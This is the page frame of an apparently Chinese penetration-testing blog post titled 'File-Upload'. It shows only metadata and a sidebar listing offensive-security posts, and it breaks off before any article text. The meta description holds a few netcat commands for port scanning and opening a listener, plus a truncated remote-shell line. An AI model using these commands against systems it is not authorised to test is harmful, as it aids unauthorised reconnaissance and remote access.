<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>File-Upload | 10fteam</title>
  <meta name="keywords" content=" 漏洞 ">
  <meta name="description" content="File-Upload | 10fteam">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="0x00 NC 0x01 NC使用扫描 nc -v ip port #扫描某IP某端口  nc -nvv -u -w 2 -z ip port-port #-u：扫描某IP某UDP端口段，-w：延时2秒，-z：关闭输入输出监听转发 nc -l -v -p 8888 #监听本地TCP 8888端口 nc -lvp 8888 &amp;gt; 1.txt #重定向到文件1.txt 正向 远程 nc -lp p">
<meta name="keywords" content="工具,proxy">
<meta property="og:type" content="article">
<meta property="og:title" content="NC">
<meta property="og:url" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;NC&#x2F;index.html">
<meta property="og:site_name" content="10fteam">
<meta property="og:description" content="0x00 NC 0x01 NC使用扫描 nc -v ip port #扫描某IP某端口  nc -nvv -u -w 2 -z ip port-port #-u：扫描某IP某UDP端口段，-w：延时2秒，-z：关闭输入输出监听转发 nc -l -v -p 8888 #监听本地TCP 8888端口 nc -lvp 8888 &amp;gt; 1.txt #重定向到文件1.txt 正向 远程 nc -lp p">
<meta property="og:locale" content="default">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;NC&#x2F;1.png">
<meta property="og:updated_time" content="2020-07-11T14:12:21.251Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;NC&#x2F;1.png">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.0.1" ></script>

</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value="">
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>10fteam</span>
</div>

<div class="icon">
    
</div>




<ul>
    <li><div class="all active">全部文章<small>(87)</small></div></li>
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    
    
    
    
    
    
    
    </div>
    <div><a  class="friends">传送门</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="87">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        安全链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://www.baidu.com/">百度一下</a></li>
            
            <li><a target="_blank" href="https://github.com/">GitHub</a></li>
            
            <li><a target="_blank" href="https://www.freebuf.com/">freebuf</a></li>
            
            <li><a target="_blank" href="https://www.anquanke.com/">安全客</a></li>
            
            <li><a target="_blank" href="https://xz.aliyun.com/">先知社区</a></li>
            
            <li><a target="_blank" href="https://www.pediy.com/">看雪</a></li>
            
            <li><a target="_blank" href="https://www.52pojie.cn/">吾爱破解</a></li>
            
            <li><a target="_blank" href="https://bbs.ichunqiu.com/portal.php">I春秋</a></li>
            
            <li><a target="_blank" href="https://ipcmen.com/">Linux命令</a></li>
            
            <li><a target="_blank" href="https://start.me/p/X20Apn">安全导航1</a></li>
            
            <li><a target="_blank" href="https://www.shentoushi.top/">安全导航2</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode==13){return false;}">
        <input class="search" type="text" placeholder="以 in: 开头进行全文搜索" autocomplete="off"id="local-search-input" >
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a class="color4">CTF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">encrypt_decrypt</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">知识</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">backdoor</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">shell</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">工具</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">内网渗透</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">C2</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">kali</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">漏洞</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CVE</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">vulhub</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">HTB</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">靶机</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">writeup</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">Linux</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">信息搜集</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">安全加固</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">入侵检测</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">应急响应</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">linux</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">脚本</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">MSF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">proxy</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">PHP</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">代码审计</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">POC</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">EXP</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">PWN</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">python</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">数据库</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">mssql</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">注入</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">phpmyadmin</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">SQL</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">Struts2</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">中间件</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">weblogic</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">windows</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">mimikatz</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">xss</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">DOM</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">bypass</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">encode_decode</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">后门</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">靶场</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">vulnhub</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">僵尸网络</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">webshell</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">免杀</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">绕过</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">域渗透</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">端口</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">提权</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CDN</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">DLL</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">WAF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">MISC</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">逆向</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        <a  class=""
           href="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"
           data-tag="CTF,encrypt_decrypt"
           data-author="" >
            <span class="post-title" title="2019红帽杯之恶臭的数据包">2019红帽杯之恶臭的数据包</span>
            <span class="post-date" title="2019-12-04 21:47:23">2019/12/04</span>
        </a>
        
        <a  class=""
           href="/ASCII%E7%A0%81%E8%A1%A8/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="ASCII码表">ASCII码表</span>
            <span class="post-date" title="2020-04-26 21:44:03">2020/04/26</span>
        </a>
        
        <a  class=""
           href="/CTF-RSA/"
           data-tag="CTF,encrypt_decrypt"
           data-author="" >
            <span class="post-title" title="CTF-RSA">CTF-RSA</span>
            <span class="post-date" title="2019-11-30 20:07:30">2019/11/30</span>
        </a>
        
        <a  class=""
           href="/ATTACK%E5%AD%A6%E4%B9%A0/"
           data-tag="知识,backdoor,shell"
           data-author="" >
            <span class="post-title" title="ATTACK学习">ATTACK学习</span>
            <span class="post-date" title="2020-01-13 10:26:28">2020/01/13</span>
        </a>
        
        <a  class=""
           href="/CobaltStrike/"
           data-tag="知识,工具,内网渗透"
           data-author="" >
            <span class="post-title" title="CobaltStrike">CobaltStrike</span>
            <span class="post-date" title="2020-01-04 19:01:40">2020/01/04</span>
        </a>
        
        <a  class=""
           href="/Command-And-Control/"
           data-tag="C2"
           data-author="" >
            <span class="post-title" title="Command-And-Control">Command-And-Control</span>
            <span class="post-date" title="2020-07-01 23:56:45">2020/07/01</span>
        </a>
        
        <a  class=""
           href="/Crunch/"
           data-tag="工具,kali"
           data-author="" >
            <span class="post-title" title="Crunch">Crunch</span>
            <span class="post-date" title="2020-05-16 11:01:06">2020/05/16</span>
        </a>
        
        <a  class=""
           href="/DNS%E5%9F%9F%E4%BC%A0%E9%80%81/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="DNS域传送漏洞">DNS域传送漏洞</span>
            <span class="post-date" title="2020-04-28 23:13:04">2020/04/28</span>
        </a>
        
        <a  class=""
           href="/DNSlog/"
           data-tag="工具,漏洞"
           data-author="" >
            <span class="post-title" title="DNSlog">DNSlog</span>
            <span class="post-date" title="2020-04-02 21:45:16">2020/04/02</span>
        </a>
        
        <a  class=""
           href="/DNS%E8%AE%B0%E5%BD%95/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="DNS记录">DNS记录</span>
            <span class="post-date" title="2019-12-06 22:37:01">2019/12/06</span>
        </a>
        
        <a  class=""
           href="/Fastjson/"
           data-tag="漏洞,CVE,vulhub"
           data-author="" >
            <span class="post-title" title="Fastjson">Fastjson</span>
            <span class="post-date" title="2020-04-22 08:12:51">2020/04/22</span>
        </a>
        
        <a  class=""
           href="/File-Upload/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="File-Upload">File-Upload</span>
            <span class="post-date" title="2020-01-06 18:23:35">2020/01/06</span>
        </a>
        
        <a  class=""
           href="/HTB-Wall/"
           data-tag="HTB,靶机,writeup"
           data-author="" >
            <span class="post-title" title="HTB-Wall">HTB-Wall</span>
            <span class="post-date" title="2019-12-17 22:06:37">2019/12/17</span>
        </a>
        
        <a  class=""
           href="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="JSON劫持攻击">JSON劫持攻击</span>
            <span class="post-date" title="2020-02-02 21:08:10">2020/02/02</span>
        </a>
        
        <a  class=""
           href="/Linux-so%E6%96%87%E4%BB%B6/"
           data-tag="知识,Linux"
           data-author="" >
            <span class="post-title" title="Linux-.so文件">Linux-.so文件</span>
            <span class="post-date" title="2020-01-06 11:02:40">2020/01/06</span>
        </a>
        
        <a  class=""
           href="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"
           data-tag="Linux,信息搜集,安全加固,入侵检测,应急响应"
           data-author="" >
            <span class="post-title" title="Linux_信息搜集_安全加固_入侵检测_应急响应">Linux_信息搜集_安全加固_入侵检测_应急响应</span>
            <span class="post-date" title="2019-12-03 22:17:19">2019/12/03</span>
        </a>
        
        <a  class=""
           href="/Linux%E4%B9%8Bshell%E8%84%9A%E6%9C%AC/"
           data-tag="linux,脚本"
           data-author="" >
            <span class="post-title" title="Linux之shell脚本">Linux之shell脚本</span>
            <span class="post-date" title="2020-07-09 18:53:46">2020/07/09</span>
        </a>
        
        <a  class=""
           href="/MetasploitFramework/"
           data-tag="工具,MSF"
           data-author="" >
            <span class="post-title" title="MetasploitFramework">MetasploitFramework</span>
            <span class="post-date" title="2020-05-04 22:54:45">2020/05/04</span>
        </a>
        
        <a  class=""
           href="/NC/"
           data-tag="工具,proxy"
           data-author="" >
            <span class="post-title" title="NC">NC</span>
            <span class="post-date" title="2020-07-11 21:36:54">2020/07/11</span>
        </a>
        
        <a  class=""
           href="/Nmap/"
           data-tag="工具,信息搜集"
           data-author="" >
            <span class="post-title" title="Nmap">Nmap</span>
            <span class="post-date" title="2020-01-19 22:12:03">2020/01/19</span>
        </a>
        
        <a  class=""
           href="/PHPMailer%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="PHPMailer漏洞">PHPMailer漏洞</span>
            <span class="post-date" title="2020-04-08 07:12:40">2020/04/08</span>
        </a>
        
        <a  class=""
           href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/"
           data-tag="PHP,代码审计"
           data-author="" >
            <span class="post-title" title="PHP代码审计学习1">PHP代码审计学习1</span>
            <span class="post-date" title="2019-12-12 15:39:42">2019/12/12</span>
        </a>
        
        <a  class=""
           href="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞,PHP"
           data-author="" >
            <span class="post-title" title="PHP之配置漏洞">PHP之配置漏洞</span>
            <span class="post-date" title="2020-04-04 21:36:24">2020/04/04</span>
        </a>
        
        <a  class=""
           href="/PHP%E5%AD%A6%E4%B9%A0/"
           data-tag="知识,PHP"
           data-author="" >
            <span class="post-title" title="PHP学习">PHP学习</span>
            <span class="post-date" title="2020-01-01 23:49:08">2020/01/01</span>
        </a>
        
        <a  class=""
           href="/POC&EXP_Write/"
           data-tag="POC,EXP"
           data-author="" >
            <span class="post-title" title="POC&amp;EXP_Write">POC&amp;EXP_Write</span>
            <span class="post-date" title="2019-11-30 00:45:27">2019/11/30</span>
        </a>
        
        <a  class=""
           href="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
           data-tag="CTF,PWN"
           data-author="" >
            <span class="post-title" title="PWN之程序常用的保护机制">PWN之程序常用的保护机制</span>
            <span class="post-date" title="2019-12-05 15:59:05">2019/12/05</span>
        </a>
        
        <a  class=""
           href="/Powershell/"
           data-tag="工具"
           data-author="" >
            <span class="post-title" title="Powershell">Powershell</span>
            <span class="post-date" title="2020-01-15 14:42:24">2020/01/15</span>
        </a>
        
        <a  class=""
           href="/Python-requests/"
           data-tag="python"
           data-author="" >
            <span class="post-title" title="Python_requests模块">Python_requests模块</span>
            <span class="post-date" title="2019-11-29 19:05:39">2019/11/29</span>
        </a>
        
        <a  class=""
           href="/PWN%E5%AD%A6%E4%B9%A0/"
           data-tag="CTF,PWN"
           data-author="" >
            <span class="post-title" title="PWN学习">PWN学习</span>
            <span class="post-date" title="2019-12-04 22:13:47">2019/12/04</span>
        </a>
        
        <a  class=""
           href="/Python%E5%9F%BA%E7%A1%80/"
           data-tag="知识,python"
           data-author="" >
            <span class="post-title" title="Python3基础">Python3基础</span>
            <span class="post-date" title="2019-12-23 23:14:43">2019/12/23</span>
        </a>
        
        <a  class=""
           href="/SqlServer/"
           data-tag="数据库,mssql"
           data-author="" >
            <span class="post-title" title="SqlServer">SqlServer</span>
            <span class="post-date" title="2020-05-24 19:54:32">2020/05/24</span>
        </a>
        
        <a  class=""
           href="/SSRF/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="SSRF">SSRF</span>
            <span class="post-date" title="2020-01-24 11:50:18">2020/01/24</span>
        </a>
        
        <a  class=""
           href="/SQL%E6%B3%A8%E5%85%A5/"
           data-tag="注入,phpmyadmin,SQL"
           data-author="" >
            <span class="post-title" title="SQL注入">SQL注入</span>
            <span class="post-date" title="2019-12-01 21:45:31">2019/12/01</span>
        </a>
        
        <a  class=""
           href="/Sqlmap/"
           data-tag="工具"
           data-author="" >
            <span class="post-title" title="Sqlmap">Sqlmap</span>
            <span class="post-date" title="2020-05-24 01:39:30">2020/05/24</span>
        </a>
        
        <a  class=""
           href="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/"
           data-tag="漏洞,vulhub,Struts2"
           data-author="" >
            <span class="post-title" title="Struts2漏洞系列">Struts2漏洞系列</span>
            <span class="post-date" title="2019-12-20 14:38:43">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/Thinkphp/"
           data-tag="漏洞,CVE,vulhub"
           data-author="" >
            <span class="post-title" title="Thinkphp">Thinkphp</span>
            <span class="post-date" title="2020-03-31 20:38:23">2020/03/31</span>
        </a>
        
        <a  class=""
           href="/Tomcat/"
           data-tag="漏洞,中间件"
           data-author="" >
            <span class="post-title" title="Tomcat">Tomcat</span>
            <span class="post-date" title="2020-05-14 20:46:32">2020/05/14</span>
        </a>
        
        <a  class=""
           href="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞,CVE,weblogic"
           data-author="" >
            <span class="post-title" title="Weblogic序列漏洞">Weblogic序列漏洞</span>
            <span class="post-date" title="2019-12-25 11:09:00">2019/12/25</span>
        </a>
        
        <a  class=""
           href="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/"
           data-tag="工具,内网渗透,windows,mimikatz"
           data-author="" >
            <span class="post-title" title="Windows之凭证">Windows之凭证</span>
            <span class="post-date" title="2020-04-20 22:12:56">2020/04/20</span>
        </a>
        
        <a  class=""
           href="/Windows%E4%B9%8B%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8/"
           data-tag="工具,windows"
           data-author="" >
            <span class="post-title" title="Windows之认证与利用">Windows之认证与利用</span>
            <span class="post-date" title="2020-04-19 15:08:46">2020/04/19</span>
        </a>
        
        <a  class=""
           href="/Windows%E5%AE%89%E5%85%A8/"
           data-tag="应急响应,windows"
           data-author="" >
            <span class="post-title" title="Windows安全">Windows安全</span>
            <span class="post-date" title="2020-04-10 20:48:56">2020/04/10</span>
        </a>
        
        <a  class=""
           href="/XSS/"
           data-tag="漏洞,xss,DOM,bypass"
           data-author="" >
            <span class="post-title" title="XSS">XSS</span>
            <span class="post-date" title="2019-12-18 13:24:05">2019/12/18</span>
        </a>
        
        <a  class=""
           href="/backdoors/"
           data-tag="backdoor"
           data-author="" >
            <span class="post-title" title="backdoors">backdoors</span>
            <span class="post-date" title="2019-12-14 18:13:22">2019/12/14</span>
        </a>
        
        <a  class=""
           href="/docker%E4%BD%BF%E7%94%A8/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="docker使用">docker使用</span>
            <span class="post-date" title="2019-12-20 15:17:33">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/hashcat/"
           data-tag="工具"
           data-author="" >
            <span class="post-title" title="hashcat">hashcat</span>
            <span class="post-date" title="2019-12-26 11:11:09">2019/12/26</span>
        </a>
        
        <a  class=""
           href="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"
           data-tag="知识,encode_decode"
           data-author="" >
            <span class="post-title" title="python与编码解码">python与编码解码</span>
            <span class="post-date" title="2020-02-03 11:53:33">2020/02/03</span>
        </a>
        
        <a  class=""
           href="/hexo-help/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="hexo_help">hexo_help</span>
            <span class="post-date" title="2019-11-29 16:45:43">2019/11/29</span>
        </a>
        
        <a  class=""
           href="/phpmyadmin/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="phpmyadmin">phpmyadmin</span>
            <span class="post-date" title="2020-05-17 20:08:29">2020/05/17</span>
        </a>
        
        <a  class=""
           href="/python%E5%B0%8F%E8%84%9A%E6%9C%AC/"
           data-tag="python"
           data-author="" >
            <span class="post-title" title="python小脚本">python小脚本</span>
            <span class="post-date" title="2020-02-26 10:59:03">2020/02/26</span>
        </a>
        
        <a  class=""
           href="/shell/"
           data-tag="shell,后门"
           data-author="" >
            <span class="post-title" title="shell">shell</span>
            <span class="post-date" title="2020-01-04 16:49:08">2020/01/04</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8B21LTLTR-Scene-1/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之21LTLTR_Scene_1">vulnhub之21LTLTR_Scene_1</span>
            <span class="post-date" title="2019-12-28 21:03:12">2019/12/28</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/"
           data-tag="靶场,vulnhub,僵尸网络"
           data-author="" >
            <span class="post-title" title="vulnhub之Bitbot.VulnVM-disk1">vulnhub之Bitbot.VulnVM-disk1</span>
            <span class="post-date" title="2019-12-30 00:22:42">2019/12/30</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BBrainpan-III/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之Brainpan_III">vulnhub之Brainpan_III</span>
            <span class="post-date" title="2019-12-30 23:32:53">2019/12/30</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BHolynix-v1/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之Holynix-v1">vulnhub之Holynix-v1</span>
            <span class="post-date" title="2020-03-20 15:32:27">2020/03/20</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF4">vulnhub之LAMPSecurity-CTF4</span>
            <span class="post-date" title="2020-03-16 14:27:30">2020/03/16</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF6">vulnhub之LAMPSecurity-CTF6</span>
            <span class="post-date" title="2020-03-17 13:51:54">2020/03/17</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF5">vulnhub之LAMPSecurity-CTF5</span>
            <span class="post-date" title="2020-03-16 15:47:07">2020/03/16</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF7">vulnhub之LAMPSecurity-CTF7</span>
            <span class="post-date" title="2020-03-18 14:49:09">2020/03/18</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之LAMPSecurity-CTF8">vulnhub之LAMPSecurity-CTF8</span>
            <span class="post-date" title="2020-03-18 22:32:59">2020/03/18</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8Bchakravyuh/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之chakravyuh">vulnhub之chakravyuh</span>
            <span class="post-date" title="2020-01-22 12:08:00">2020/01/22</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BOs-hackNos-3/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之Os-hackNos-3">vulnhub之Os-hackNos-3</span>
            <span class="post-date" title="2020-01-02 13:21:15">2020/01/02</span>
        </a>
        
        <a  class=""
           href="/webshell/"
           data-tag="shell,webshell"
           data-author="" >
            <span class="post-title" title="webshell">webshell</span>
            <span class="post-date" title="2020-05-04 23:57:34">2020/05/04</span>
        </a>
        
        <a  class=""
           href="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="信息安全百科">信息安全百科</span>
            <span class="post-date" title="2020-03-20 23:03:55">2020/03/20</span>
        </a>
        
        <a  class=""
           href="/%E5%85%8D%E6%9D%80/"
           data-tag="免杀,绕过"
           data-author="" >
            <span class="post-title" title="免杀">免杀</span>
            <span class="post-date" title="2020-05-01 12:58:09">2020/05/01</span>
        </a>
        
        <a  class=""
           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/"
           data-tag="内网渗透"
           data-author="" >
            <span class="post-title" title="内网渗透之Empire">内网渗透之Empire</span>
            <span class="post-date" title="2019-12-19 11:42:47">2019/12/19</span>
        </a>
        
        <a  class=""
           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/"
           data-tag="工具,内网渗透,windows,域渗透"
           data-author="" >
            <span class="post-title" title="内网渗透之windows">内网渗透之windows</span>
            <span class="post-date" title="2020-02-20 13:44:17">2020/02/20</span>
        </a>
        
        <a  class=""
           href="/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞,端口"
           data-author="" >
            <span class="post-title" title="各端口服务漏洞">各端口服务漏洞</span>
            <span class="post-date" title="2019-12-17 20:27:22">2019/12/17</span>
        </a>
        
        <a  class=""
           href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
           data-tag="知识,漏洞"
           data-author="" >
            <span class="post-title" title="同源策略">同源策略</span>
            <span class="post-date" title="2020-02-02 15:18:48">2020/02/02</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/"
           data-tag="Linux,提权"
           data-author="" >
            <span class="post-title" title="提权之Linux-dirtycow">提权之Linux-dirtycow</span>
            <span class="post-date" title="2019-12-23 20:26:44">2019/12/23</span>
        </a>
        
        <a  class=""
           href="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/"
           data-tag="信息搜集,CDN"
           data-author="" >
            <span class="post-title" title="寻找网站的真实IP">寻找网站的真实IP</span>
            <span class="post-date" title="2019-12-03 13:41:27">2019/12/03</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"
           data-tag="提权"
           data-author="" >
            <span class="post-title" title="提权之Linux-利用通配符本地提权">提权之Linux-利用通配符本地提权</span>
            <span class="post-date" title="2020-02-13 22:04:26">2020/02/13</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"
           data-tag="linux,提权"
           data-author="" >
            <span class="post-title" title="提权之Linux-环境变量">提权之Linux-环境变量</span>
            <span class="post-date" title="2020-02-09 11:16:30">2020/02/09</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/"
           data-tag="linux,提权"
           data-author="" >
            <span class="post-title" title="提权之Linux">提权之Linux</span>
            <span class="post-date" title="2020-05-24 00:58:53">2020/05/24</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
           data-tag="windows,提权"
           data-author="" >
            <span class="post-title" title="提权之Windows">提权之Windows</span>
            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/"
           data-tag="Linux,提权"
           data-author="" >
            <span class="post-title" title="提权之linux-suid">提权之linux-suid</span>
            <span class="post-date" title="2020-04-07 21:02:38">2020/04/07</span>
        </a>
        
        <a  class=""
